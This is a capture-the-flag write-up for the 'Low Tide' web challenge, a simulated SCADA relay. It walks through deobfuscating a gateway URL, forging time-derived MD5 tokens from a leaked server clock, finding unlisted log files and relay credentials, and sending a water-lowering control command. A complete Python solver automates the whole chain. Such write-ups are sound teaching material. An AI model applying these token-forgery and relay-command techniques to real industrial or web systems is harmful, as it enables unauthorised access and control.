# Low Tide

| Event | Category | Flag format | Flag |
|---|---|---|---|
| CSAW CTF Finals 2026 | Web | `csaw{...}` (submit lowercase; the service emits uppercase) | `csaw{REDACTED}` |

**TL;DR** — A five-stage SCADA proxy chain against a load-balanced Flask backend: deobfuscate a
gateway URL from static JS, forge a time-derived gateway token, walk a virtual filesystem to an
unlisted log file, follow its breadcrumbs to chat-bridge credentials, read the archive for the
relay key and admin IP, then issue a SCADA command that trips a **LOW LEVEL** alarm and releases
the flag. The hardest part is not the crypto — it is the load balancer, which silently routes you
to one of four workers and **only one of them serves the relay route**.

> **Flag redaction.** Published originally with the flag redacted and no local copy survives, so
> `csaw{REDACTED}` is kept rather than invented.

---

## 0. Architecture

| Component | Host | Role |
|---|---|---|
| Frontend | `low-tide.ctf.csaw.io` | Static Nginx — a decoy login page |
| Backend / LB | `low-tide-lb.ctf.csaw.io` | Gunicorn/Flask behind an ALB |

Only URLs under `/station/checkin/...` reach Flask; bare `/api/v1` or `/api/v2` prefixes 404.

Four simulated station workers sit behind the ALB, each with its own baseline clock:

| Station | Baseline date |
|---|---|
| st-01 | 2018-07-12 |
| st-02 | 2015-06-10 |
| st-03 | 2016-08-20 |
| st-04 | 2019-03-15 |

**Only `st-04` serves the relay route.** Internalise this before debugging anything else: the
same request can succeed or fail depending purely on which worker your connection landed on.

---

## 1. Frontend deobfuscation

### 1.1 The gateway address

`assets/app.js` carries an obfuscated blob:

```js
4@?DE vp%t(p* lQ9EEADi^^=@H\E:56\=3]4E7]4D2H]:@^DE2E:@?^4964<:?Q
```

ROT47 (rotate printable ASCII 33–126 by 47) plus a trailing hex decode gives:

```js
const GATEWAY = "https://low-tide-lb.ctf.csaw.io/station/checkin";
```

```python
def rot47(s):
    return "".join(chr(33 + ((ord(c) - 33 + 47) % 94)) if 33 <= ord(c) <= 126 else c for c in s)
```

### 1.2 The required User-Agent

`app.js` declares `const REQUIRED_AGENT =` and leaves it empty. The real value hides in
`robots.txt` comments:

```
# StationSync-Agent/2.1
# FieldSync-Client/3.0
# MonitorAgent/2.2
# StationSync-Agent/2.0
# RelayCheck-Bot/1.9
```

Only `StationSync-Agent/2.1` is accepted. The others — `RelayCheck-Bot/1.9` especially — receive
no session cookie and see only a frozen legacy clock. That is a decoy designed to look like
progress.

### 1.3 Other red herrings

- `renderStatus` is obfuscated by even/odd character interleaving. It is just DOM code.
- `/internal-monitor/` and `/relay-status/` are dead ends.

---

## 2. Gateway authentication

```http
POST /station/checkin
User-Agent: StationSync-Agent/2.1

action=checkin
```

This sets a 16-hex-character `sid` cookie and pins the connection to one worker.

Sending `action=checkin&token=probe` makes the server volunteer its own clock in the error:

```json
{
  "reason": "code_mismatch: expected token derived from current sync time",
  "result": "rejected",
  "sync_time": "2019-03-15T16:35:32Z"
}
```

That error message is the whole authentication bypass — it hands you the only value you were
missing:

```
token = md5(sid + str(int(unix_epoch_of_station_sync_time)))
```

```python
import hashlib, datetime

ep = int(datetime.datetime.strptime(sync_time, "%Y-%m-%dT%H:%M:%SZ")
         .replace(tzinfo=datetime.UTC).timestamp())
token = hashlib.md5((sid + str(ep)).encode()).hexdigest()
```

The station clock keeps ticking, so the token must be regenerated for almost every request.

---

## 3. The virtual filesystem

Authenticated paths live under:

```
POST /station/checkin/api/v1/<station_id>/<path>
```

The tree:

```
/                        -> station.log, config/
/config/                 -> sync.conf, relay-bot.js, relay_chat.js
/.logs/                  -> err_3005.log      (not listed in ANY directory)
```

`.logs/` is hidden from directory listings. It is discoverable only because `station.log`
mentions it in passing:

```
[st-04] WARN: stale handler dump written to .logs/err_3005.log
```

Following the breadcrumbs:

- `.logs/err_3005.log` → *chat bridge relocated: `config/relay_chat.js`*
- `config/relay_chat.js` → endpoint `v2/chat`, see `sync.conf`
- `config/sync.conf` → the chat bridge handshake:

```
chat bridge auth: Authorization: Bot <token>
token = md5(station_id + MMM + DD + YY + HH + MM), all lowercase/zero-padded, e.g. mar05191324
params: id=<message id, batch of 5>
```

`relay-bot.js` is a red herring — its "token rotation broke auth" comment is deliberately
misleading.

---

## 4. The chat bridge

```http
GET /station/checkin/api/v2/chat?id=<n>
Authorization: Bot <md5(station_id + strftime("%b%d%y%H%M").lower())>
```

Returns batches of 5 messages. There are 60 in total, and messages 45–60 hold the secrets:

| # | Content |
|---|---|
| 49 | Only `raise` and `lower` are exposed on the water level. |
| 53 | Relay is wired through **station 4**, the only one with the proxy route. |
| 55 | Relay key `4f9a-77c2-e01d`; admin box `10.10.14.31`. |
| 56 | Big value swings trip a **hard alarm**. |

Message 56 is the actual objective hint: you are not trying to *avoid* the alarm, you are trying
to cause one.

---

## 5. The relay

Endpoint: `POST /station/checkin/relay` (no trailing slash).

The response vocabulary doubles as a debugger — learn to read it:

| Request state | Response |
|---|---|
| Wrong worker (st-01/02/03) | `unsupported_action` |
| No `X-Relay-Target` | `invalid_relay_target` |
| Target present, no `cmd` | `invalid_command` |
| Bad or stale gateway token | `code_mismatch` |
| `cmd` valid, key missing/wrong | `relay_auth_failed` |
| Everything correct | `accepted` + `relay{}` |

Working request:

```http
POST /station/checkin/relay HTTP/1.1
Host: low-tide-lb.ctf.csaw.io
User-Agent: StationSync-Agent/2.1
X-Relay-Target: http://10.10.14.31/
X-Relay-Key: 4f9a-77c2-e01d
Cookie: sid=<session sid>
Content-Type: application/x-www-form-urlencoded

action=checkin&token=<md5(sid+station_epoch)>&cmd=CMD:WATER:LOWER:50
```

Details that cost time:

- `action` stays `checkin`. `raise` / `lower` / `control` are invalid *actions*.
- The command goes in the `cmd` parameter, colon-delimited: `CMD:WATER:LOWER:<magnitude>`.
- The relay key and target must be **headers**, not form fields.

```json
{
  "relay": {
    "alarm": "LOW LEVEL",
    "flag": "csaw{REDACTED}",
    "status": "critical",
    "water_level": 20
  },
  "result": "accepted",
  "role": "system_check",
  "station_id": "st-04"
}
```

---

## 6. Solver

```python
#!/usr/bin/env python3
# solve.py — Low Tide: end-to-end relay exploit.
#
# usage: python solve.py
import time
import hashlib
import datetime
import requests

LB = "https://low-tide-lb.ctf.csaw.io"
UA = "StationSync-Agent/2.1"
KEY = "4f9a-77c2-e01d"
HDR = {"X-Relay-Target": "http://10.10.14.31/", "X-Relay-Key": KEY}


class Station:
    def __init__(self):
        self.s = requests.Session()
        self.s.headers["User-Agent"] = UA
        self.sid = None

    def post(self, path, data=None, headers=None, tries=8):
        for _ in range(tries):
            r = self.s.post(f"{LB}{path}", data=data or {}, headers=headers or {}, timeout=25)
            if r.status_code == 429:
                try:
                    wait = float(r.json().get("retry_after", 5))
                except Exception:
                    wait = 5
                time.sleep(wait + 0.4)
                continue
            return r
        return r

    def boot(self):
        self.post("/station/checkin", {"action": "checkin"})
        self.sid = self.s.cookies.get("sid")

    def station_epoch(self):
        j = self.post("/station/checkin", {"action": "checkin", "token": "probe"}).json()
        t = j.get("sync_time")
        if not t:
            return None
        return int(datetime.datetime.strptime(t, "%Y-%m-%dT%H:%M:%SZ")
                   .replace(tzinfo=datetime.UTC).timestamp())

    def token(self):
        return hashlib.md5((self.sid + str(self.station_epoch())).encode()).hexdigest()

    def auth(self):
        return self.post("/station/checkin", {"action": "checkin", "token": self.token()}).json()


# Only st-04 serves the relay. The ALB assigns a worker per connection,
# so keep opening sessions until one lands on st-04.
while True:
    st = Station()
    st.boot()
    if st.auth().get("station_id") == "st-04":
        break
    time.sleep(1.5)

r = st.post(
    "/station/checkin/relay",
    {"action": "checkin", "token": st.token(), "cmd": "CMD:WATER:LOWER:50"},
    HDR,
)
print(r.status_code, r.text)
```

---

## 7. Pitfalls

1. **Station drift silently changes the answer.** `unsupported_action` from the relay almost
   always means you hit st-01/02/03, not that a parameter is wrong. Always confirm
   `station_id == "st-04"` before concluding anything from a response.
2. **`/relay/<anything>` is a catch-all heartbeat.** `/relay/raise`, `/relay/lower` and
   `/relay/bogus` all return a generic accepted response — the command is *not* in the path.
3. **The token was never the problem.** `relay-bot.js` steers you toward elaborate rotating-token
   schemes; the relay simply reuses the gateway token.
4. **Self-inflicted rate limiting.** Each probe costs about five requests. Once the 429 backoffs
   start, a solver can spend its whole budget asleep.
5. **The command schema is not derivable from the artifacts.** The exact `cmd=CMD:WATER:LOWER:50`
   format and the `cmd` parameter name appear nowhere in the virtual filesystem; they had to be
   inferred or taken from a hint.

---

## Attack chain summary

```
static page (decoy)
  ├─ app.js      ── ROT47/hex ─→ GATEWAY url
  └─ robots.txt  ──────────────→ User-Agent: StationSync-Agent/2.1
       └─ POST /station/checkin ─→ sid cookie + simulated clock
            └─ token = md5(sid + station_epoch)
                 └─ /api/v1/<st>/ virtual filesystem
                      └─ station.log ─→ .logs/err_3005.log        (unlisted)
                           └─ config/relay_chat.js ─→ config/sync.conf
                                └─ chat token = md5(station_id + %b%d%y%H%M)
                                     └─ /api/v2/chat ─→ relay key + admin IP
                                          └─ POST /station/checkin/relay
                                               X-Relay-Target + X-Relay-Key
                                               cmd=CMD:WATER:LOWER:50
                                                    └─ LOW LEVEL alarm ─→ FLAG
```

---

## Flag

```
csaw{REDACTED}
```

The service emits it uppercase; submit lowercase to match the CTF's flag format.

---

## Takeaways

- **Error messages that quote server state are credentials.** `sync_time` in a rejection turned
  an unguessable time-derived token into one line of MD5.
- **With a load balancer in front, treat worker identity as part of your request.** Any black-box
  conclusion drawn without pinning the worker is unreliable.
- **Files hidden from listings are still readable.** A single passing mention in a log was the
  only reference to `.logs/err_3005.log`; read logs for *paths*, not just for content.
- **Budget your requests when rate limiting exists.** Probing cost more than solving.

## Files

- `solve.py` — full end-to-end solver.
- `frontend/app.js`, `frontend/robots.txt`, `frontend/index.html` — the original frontend
  files, kept so the ROT47 blob and the User-Agent comments can be checked directly.
